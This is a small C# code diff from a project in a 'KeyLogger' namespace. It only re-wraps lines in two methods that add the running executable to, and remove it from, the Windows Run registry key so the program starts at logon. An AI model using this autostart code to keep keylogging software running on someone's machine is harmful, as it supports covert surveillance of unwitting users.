@@ -86,7 +86,8 @@ namespace KeyLogger
         {
             string pathRegistryKeyStartup = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
             string pathToExeFile = Assembly.GetExecutingAssembly().Location;
-            using (RegistryKey registryKeyStartup = Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            using (RegistryKey registryKeyStartup = 
+                  Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
             {
                 registryKeyStartup.SetValue(name, $"\"{pathToExeFile}\"");
             }
@@ -95,7 +96,8 @@ namespace KeyLogger
         static public void DeleteFromStartUp(string name)
         {
             string pathRegistryKeyStartup = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
-            using (RegistryKey registryKeyStartup = Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
+            using (RegistryKey registryKeyStartup =
+                   Registry.CurrentUser.OpenSubKey(pathRegistryKeyStartup, true))
             {
                 registryKeyStartup.DeleteValue(name, false);
             }
